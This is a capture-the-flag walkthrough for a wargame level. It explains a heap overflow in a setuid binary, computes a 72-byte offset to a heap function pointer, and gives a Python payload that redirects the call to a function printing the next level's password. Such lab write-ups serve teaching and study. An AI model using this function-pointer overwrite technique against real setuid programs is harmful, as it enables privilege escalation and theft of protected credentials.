level6 - walkthrough
====================

Target: /home/user/level6/level6   (setuid + setgid level7)
Goal:   read /home/user/level7/.pass

1. The bug
   main() does:
     buf = malloc(0x40);            ; 64-byte buffer
     fp  = malloc(4);               ; holds a function pointer, default = m()
     strcpy(buf, argv[1]);          ; <-- no bound -> heap overflow
     (*fp)();                       ; calls through the pointer
   Helper functions:
     n() @ 0x08048454 : system("/bin/cat /home/user/level7/.pass")
     m() @ 0x08048468 : puts("Nope")   (the default target)

2. Offset
   buf and fp are consecutive heap chunks: buf = 0x0804a008, fp = 0x0804a050,
   so fp - buf = 0x48 = 72. Byte 72 of the input lands on the function pointer.

3. Payload  (Ressources/exploit.py)
     payload = b"A"*72 + p32(0x08048454)
   72 filler bytes, then &n. The overflow overwrites the function pointer with
   &n, so the indirect call runs n() instead of m().

4. Run
     $ python3 Ressources/exploit.py
     $ ./level6 "$(cat payload)"
   n() cats the level7 password directly -- no shell needed.

